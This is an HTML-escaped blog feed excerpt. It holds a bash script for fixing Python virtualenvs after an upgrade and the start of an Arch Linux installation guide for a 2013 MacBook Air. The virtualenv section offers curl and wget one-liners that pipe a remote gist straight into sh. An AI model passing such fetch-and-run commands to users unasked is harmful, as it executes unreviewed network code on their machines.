&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; ~/.virtualenvs/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/bin/activate.sh  
$ chmod u+x ./fix_virtualenv.sh  
$ ./fix_virtualenv.sh  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Script for all virtualenvs under &lt;code&gt;~/.virtualenvs&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Based on the above script which for only one virtualenv,&lt;br /&gt;
I modified it to &lt;a href="https://gist.github.com/M157q/e1bf93a4a8170fabac24db9aee686caf"&gt;a slighty powerful script&lt;/a&gt; to fix all virtualenvs (include reinstall all modules in a virtualenv).  &lt;/p&gt;
&lt;h3&gt;One liner (Network needed)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sh &amp;lt;(curl -sL https://gist.githubusercontent.com/M157q/e1bf93a4a8170fabac24db9aee686caf/raw)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wget&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sh &amp;lt;(wget -qO- https://gist.githubusercontent.com/M157q/e1bf93a4a8170fabac24db9aee686caf/raw)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Plaintext&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fix_virtualenvs.sh  
---  
&lt;span class="c1"&gt;#!/usr/bin/env bash  &lt;/span&gt;

&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HOME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/.virtualenvs&amp;quot;&lt;/span&gt;  
&lt;span class="nv"&gt;ACTIVE_SH_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/activate&amp;quot;&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; dir in &lt;span class="sb"&gt;`&lt;/span&gt;find &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -type d -maxdepth &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;span class="k"&gt;do&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
        &lt;span class="k"&gt;continue&lt;/span&gt;  
    &lt;span class="k"&gt;fi&lt;/span&gt;  

    &lt;span class="nb"&gt;source&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="si"&gt;}${&lt;/span&gt;&lt;span class="nv"&gt;ACTIVE_SH_PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  

    &lt;span class="nv"&gt;ENV_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which pip&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nv"&gt;SYSTEM_VIRTUALENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which -a virtualenv&lt;span class="p"&gt;|&lt;/span&gt;tail -1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  

    &lt;span class="nb"&gt;echo&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ensure the root of current virtualenv:&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;    &lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;Say no if you are not sure (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  
    &lt;span class="nb"&gt;echo&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ ^&lt;span class="o"&gt;[&lt;/span&gt;Yy&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  

        &lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;Reinstall all packages of this virtualenv after upgraded? (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  


        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;^[Yy]&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Dump pip freeze for current virtualenv into requirements.temp&amp;quot;&lt;/span&gt;  
            pip freeze &amp;gt; requirements.temp  
        &lt;span class="k"&gt;fi&lt;/span&gt;  

        &lt;span class="nv"&gt;VIRTUALENV_PYTHON_VERSION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;python --version&lt;span class="sb"&gt;`&lt;/span&gt;  
        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Removing old symbolic links......&amp;quot;&lt;/span&gt;  
        find &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type l -delete -print  

        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Creating new symbolic links......&amp;quot;&lt;/span&gt;  
        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENV_PYTHON_VERSION&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$VIRTUALENV_PYTHON_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;Python 2&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Use Python 2 environment for this virtualenv&amp;quot;&lt;/span&gt;  
            &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; --python&lt;span class="o"&gt;=&lt;/span&gt;python2  
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$VIRTUALENV_PYTHON_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;Python 3&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Use Python 3 environment for this virtualenv&amp;quot;&lt;/span&gt;  
            &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; --python&lt;span class="o"&gt;=&lt;/span&gt;python3  
        &lt;span class="k"&gt;else&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Unknown Python version of this virtualenv&amp;quot;&lt;/span&gt;  
        &lt;span class="k"&gt;fi&lt;/span&gt;  

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;^[Yy]&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Reinstall modules from previous dumped pip freeze result.&amp;quot;&lt;/span&gt;  
            pip install -r requirements.temp  

            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Remove requirements.temp&amp;quot;&lt;/span&gt;  
            rm requirements.temp  
        &lt;span class="k"&gt;fi&lt;/span&gt;  
    &lt;span class="k"&gt;fi&lt;/span&gt;  

    deactivate  
&lt;span class="k"&gt;done&lt;/span&gt;  

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Done!&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wirtel.be/posts/en/2014/07/29/fix_virtualenv_python_brew/"&gt;Stéphane Wirtel - Read-Eval-Print Loop&lt;/a&gt; (Dead link)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/tevino/1a557a0c200d61d4e4fb"&gt;Fix python virtualenv after python update · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="virtualenv"></category></entry><entry><title>Install Arch Linux on MacBook Air Mid 2013</title><link href="https://blog.m157q.tw/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/" rel="alternate"></link><published>2017-12-08T12:47:00+08:00</published><updated>2017-12-08T12:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-09-10:posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/</id><summary type="html">&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;使用上遇到問題，才有動力去解決、改善、貢獻並回饋程式碼到上游。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;警告: 把 OS X 砍掉的話，之後要更新 firmware 必須使用有安裝 OS X 的外接硬碟上開機才能更新。&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以下這段是一堆廢話，講了我為什麼決定要把 OS X 砍了然後灌 Linux 在 MacBook Air 上&lt;br /&gt;
不想看的可以直接跳過  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;改用 OS X 的這兩年，&lt;br /&gt;
也不是說就完全沒用 Linux 了，&lt;br /&gt;
舊的筆電退役成 Server 架在宿舍裡，&lt;br /&gt;
一個不用桌面環境的 Linux ，&lt;br /&gt;
使用起來基本上是不會遇到太多問題的。&lt;br /&gt;
而 OS X 的確遇到使用上的問題減少了。&lt;br /&gt;
用起來的確跟當初想的一樣，&lt;br /&gt;
是個問題比較沒那麼多的 UNIX-like System&lt;br /&gt;
但同時也在不知不覺中漸漸喪失了解決問題的能力，&lt;br /&gt;
就好像一把兩年前就不再磨的刀劍，愈發鈍鏽。&lt;br /&gt;
當初會買 MacBook Air 而不選擇 UltraBook 的原因&lt;br /&gt;
主要是因為價錢、續航力、重量都是 MacBook Air 勝出，&lt;br /&gt;
當然之後在使用上，我也對重量和續航力很滿意，&lt;br /&gt;
但其實在使用 OS X 上也遇過許多無法接受的問題，有些妥協了，有些沒有&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原生的工具都非常老舊，舊版本代表著很多問題，無論是資安或是有無新功能。這對於一個從使用 Rolling Release 的 Arch Linux user 來說真的很不習慣。  &lt;ul&gt;
&lt;li&gt;骨灰級的 Bash 真的令我印象深刻，如果沒有 Homebrew 的話，我肯定無法用這麼久，感謝 &lt;code&gt;mxcl&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;接網路線跟螢幕線得額外花錢買轉接頭  &lt;ul&gt;
&lt;li&gt;兩個加起來新台幣 1,600 左右。恩，我跟很多人一樣都買了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OS X 10.9 以前的視窗放大真的很雞肋和令人哭笑不得，放大後不會佔滿整個桌面，有時候甚至比按完放大前更小。  &lt;ul&gt;
&lt;li&gt;在 OS X 10.10 後，放大功能直接改成全螢幕了。恩，不意外，我在 10.9 以前早就都用全螢幕了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雙螢幕在 OS X 10.10 仍然有一個我常常踩到的詭異Bug，如果有程式被丟到外接螢幕那邊，在不拔掉螢幕線的情況下，把螢幕闔上進入休眠，接著把螢幕線拔掉，然後喚醒 Mac，這時候就會發現被丟到外接螢幕的應用程式仍然被認為是在外接螢幕的範圍。但因為早就沒有外接螢幕了，所以即便程式仍然在執行，使用者也根本看不到畫面，重點是重新執行該程式也無法解決這問題，只能登出、重開機或是重新接上外接螢幕在電腦喚醒的情況下拔掉螢幕線，或是把該程式拉回原生螢幕，才有辦法解決。  &lt;ul&gt;
&lt;li&gt;我不確定 Reproduce 的機率是不是 100%，但就是偶爾會遇到，而寫這篇文章的時候已經把我手邊唯一的 OS X 砍了，所以也無從驗證。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系統介面內建中文字型不好看，要改也很難改。  &lt;ul&gt;
&lt;li&gt;還好 OS X 10.9 以前有 TCFail 能用，到了 OS X 10.10 只能去改系統檔案設定，而換成了我想用的字型以後，內建的中文輸入法就會掛掉，只好又改回原本的字型。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;輸入法也是個問題  &lt;ul&gt;
&lt;li&gt;剛用 OS X 10.8 的時候就聽很多人說內建的中文輸入法不是很好用，所以很多人都裝開源的香草或是小麥注音，我本身也是注音輸入法的使用者，但我用了以後還是不太習慣(恩，當時明明用不習慣，卻沒有跳下去幫忙貢獻)。後來找到另一款開源的中州韻輸入法(RIME)，是對岸的中國人&lt;a href="https://github.com/lotem"&gt;佛振&lt;/a&gt;開發的，在 Windows, Linux, Mac 上都能使用。裝來用以後發現還不錯用，自訂性蠻強大的，由於在用 gcin 時，我習慣把選字鍵從常人慣用的 1234567890 改成 asdfghjkl; 以減少手指移動的距離，這款輸入法也能做到，於是就用了。(至於後來關於 dvorak 跟拼音輸入法又是另一個故事了)  &lt;/li&gt;
&lt;li&gt;到了 OS X 10.10 之後，不知怎的，非官方的中文輸入法都變得超級慢，慢到無法接受，於是又換回不是很好用的官方中文輸入法。(恩，又是一個妥協，沒去追根究底找出為什麼變得這麼慢的原因)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一不小心好像離題寫了太多關於 OS X 的部份。&lt;br /&gt;
Anyway, 因為種種問題加上這次 COSCUP 的助力，&lt;br /&gt;
還是想回歸到 Linux Desktop Environment 的懷抱，&lt;br /&gt;
促使我把 Arch Linux 灌在我的 MacBook Air 2013 13' 上，&lt;br /&gt;
以下是紀錄。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下流程皆在 &lt;code&gt;MacBookAir6,2 (Macbook Air mid 2013)&lt;/code&gt; 上進行&lt;br /&gt;
不同 model 的 MacBook 會有不同的問題&lt;br /&gt;
詳見 &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Model-specific_information"&gt;https://wiki.archlinux.org/index.php/MacBook#Model-specific_information&lt;/a&gt;&lt;br /&gt;
由於我是採用把 OS X 洗掉直接裝 Arch Linux 的方式，並不是雙系統&lt;br /&gt;
所以安裝方式與一般的 Arch Linux 安裝並無太大不同，&lt;br /&gt;
故本篇文章會著重在裝好之後的一些調整  &lt;/p&gt;
&lt;p&gt;如果有人想灌成 Ubuntu 的話，可以參考 &lt;a href="https://help.ubuntu.com/community/MacBookAir"&gt;https://help.ubuntu.com/community/MacBookAir&lt;/a&gt;&lt;br /&gt;
(但上面最新的資料似乎只有到 2013 年的機種就是，當然也歡迎勇者測試之後貢獻)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;警告：MacbookAir6,2 的網卡在 Linux 上"有可能"不被支援(需視網卡型號)，  
所以可能得另購 USB 無線網卡才有無線網路  
詳情請見底下關於 Wi-Fi 的部份&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;If you want to mute the MacBook firmware boot sound,  
be sure you mute the volume of the MacBook before you eliminating OS X.&lt;/code&gt;  &lt;/p&gt;
&lt;h1&gt;Install Arch Linux Only (No OS X Dual Boot) on MacBook Air&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;WARNING: After erasing OS X,  
We can only update the MacBook Air firmware via the external drive which has already installed OS X.&lt;/code&gt;  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Make Arch Linux bootable Live USB  &lt;ul&gt;
&lt;li&gt;Go to &lt;a href="https://www.archlinux.org/download/"&gt;https://www.archlinux.org/download/&lt;/a&gt; and download the newest Arch Linux iso.  &lt;/li&gt;
&lt;li&gt;Plug in a USB drive  &lt;/li&gt;
&lt;li&gt;use &lt;code&gt;diskutil list&lt;/code&gt; to find the USB dirve &lt;code&gt;/dev/sdX&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dd if=$(path to arch linux iso) of=/dev/rsdX bs=1m&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;use raw disk (/dev/rsdX) make this quicker.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go to AppStore for updating OS X to the newest version  &lt;ul&gt;
&lt;li&gt;After the first update, reboot, and check for newest update again  &lt;/li&gt;
&lt;li&gt;Make sure it's newest update, espcially the firmware udpate  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Erase OS X  &lt;ul&gt;
&lt;li&gt;Reboot MacBook Air  &lt;/li&gt;
&lt;li&gt;Press Command + R to enter the Reinstall mode  &lt;/li&gt;
&lt;li&gt;Choose DiskUtility and Erase the entire disk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Entering Arch Linux Live USB installation  &lt;ul&gt;
&lt;li&gt;Reboot MacBook Air  &lt;/li&gt;
&lt;li&gt;Press alt/option key for entering EFI bootloader  &lt;/li&gt;
&lt;li&gt;Choose EFI USB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Install Arch Linux (Just like the normal installation with a little different)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_guide"&gt;Beginners' guide - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Important =&amp;gt; &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Arch_Only_Installation"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Need to be aware about the EFI related options  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;底下其實有些調整不是那麼必要&lt;br /&gt;
可能直接 &lt;code&gt;sudo pacman -S gnome-control-center&lt;/code&gt; 就可以解掉許多問題&lt;br /&gt;
只是個人覺得 gnome 太肥，想要用些 light weight 的 packages&lt;br /&gt;
覺得麻煩的人可以直接裝個 gnome-control-center ，然後再視情況安裝需要的東西&lt;br /&gt;
應該可以節省一些時間  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Post-Install&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Post-installation"&gt;https://wiki.archlinux.org/index.php/MacBook#Post-installation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/General_recommendations"&gt;https://wiki.archlinux.org/index.php/General_recommendations&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Install &lt;a href="https://aur.archlinux.org/packages/yaourt/"&gt;yaourt&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo mkdir /var/cache/yaourt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;save tarball to &lt;code&gt;/var/cache/yaourt&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/yaourtrc  
---  
EXPORT=1  
EXPORTDIR=&amp;quot;/var/cache/yaourt&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Configs&lt;/h2&gt;
&lt;h3&gt;dotfiles&lt;/h3&gt;
&lt;p&gt;Download my dotfiles on &lt;a href="https://github.com/M157q/dotfiles"&gt;https://github.com/M157q/dotfiles&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/M157q/dotfiles  
&lt;span class="nb"&gt;cd&lt;/span&gt; dotfiles  
make install  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Xorg&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xcompmgr xorg-xrdb&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xcompmgr"&gt;xcommpgr&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;for simple effect, like transparency in &lt;code&gt;guake&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/X_resources"&gt;xorg-xrdb&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;for &lt;code&gt;.Xresources&lt;/code&gt;, some config related to X Window  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Wi-Fi&lt;/h3&gt;
&lt;p&gt;不同型號的網卡會有不同的問題，這部份也需要多加注意。&lt;br /&gt;
光是參考 &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Wi-Fi"&gt;https://wiki.archlinux.org/index.php/MacBook#Wi-Fi&lt;/a&gt; 可能不夠&lt;br /&gt;
必須再自行找些相關資料，我在這部份卡了一陣子。  &lt;/p&gt;
&lt;p&gt;先確認是哪張網卡&lt;br /&gt;
&lt;code&gt;MacBookAir6,2&lt;/code&gt; 沒意外的話應該都是 &lt;code&gt;BCM4360&lt;/code&gt; 這張&lt;br /&gt;
但還是有細節得注意  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ lspci -vnn &lt;span class="p"&gt;|&lt;/span&gt;grep &lt;span class="m"&gt;0280&lt;/span&gt;  
&lt;span class="m"&gt;03&lt;/span&gt;:00.0 Network controller &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0280&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Broadcom Corporation BCM4360 &lt;span class="m"&gt;802&lt;/span&gt;.11ac Wireless Network Adapter &lt;span class="o"&gt;[&lt;/span&gt;14e4:43a0&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;rev &lt;span class="m"&gt;03&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Broadcom BCM4360&lt;/code&gt; 這張網卡有兩種&lt;br /&gt;
一種是 &lt;code&gt;14e4:43a0&lt;/code&gt;, 另外一種是 &lt;code&gt;14e4:4360&lt;/code&gt;&lt;br /&gt;
根據 &lt;a href="https://wireless.wiki.kernel.org/en/users/Drivers/b43?highlight=%28b43%29#Supported_devices"&gt;https://wireless.wiki.kernel.org/en/users/Drivers/b43?highlight=%28b43%29#Supported_devices&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;43a0&lt;/code&gt; 這張是被 wl 驅動程式支援的，所以如果是這張的話可以用無線網路&lt;br /&gt;
&lt;code&gt;4360&lt;/code&gt; 這張則是不被支援的，所以可能需要另外購買無線網卡&lt;br /&gt;
(我沒有親自測試過，如果有勇者或是有經驗的人歡迎回覆告知)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;43a0&lt;/code&gt; 的話照著底下的指令做應該就可以使用無線網路連網了 (kernel 為 Linux 4.1.5-1)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S broadcom-wl-dkms&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;after installation, follow the postinstall instructions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S iw&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S wicd-gtk&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;==&amp;gt; You need to restart the dbus service after  
==&amp;gt; upgrading wicd.  
==&amp;gt; Disable networkmanager, dhcpcd or other networking  
==&amp;gt; utility and add &amp;#39;wicd&amp;#39; to your systemd configuration.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;記得 &lt;code&gt;systemctl stop dhcpcd&lt;/code&gt;, &lt;code&gt;sytemctl disable dhcpcd&lt;/code&gt;,&lt;br /&gt;
&lt;code&gt;systemcl stop NetworkManager&lt;/code&gt;, &lt;code&gt;systemctl disable NetworkManager&lt;/code&gt;，&lt;br /&gt;
然後 &lt;code&gt;systemctl enable wicd&lt;/code&gt;，&lt;br /&gt;
&lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 都會跟 &lt;code&gt;wicd&lt;/code&gt; 衝突，&lt;br /&gt;
開著 &lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 的時候使用 &lt;code&gt;wicd&lt;/code&gt; 的話，&lt;br /&gt;
會無法使用無線網路連線，&lt;br /&gt;
錯誤訊息也看不出啥端倪，&lt;br /&gt;
我就是卡在這很久 Orz  &lt;/p&gt;
&lt;h4&gt;2017.10.31 更新&lt;/h4&gt;
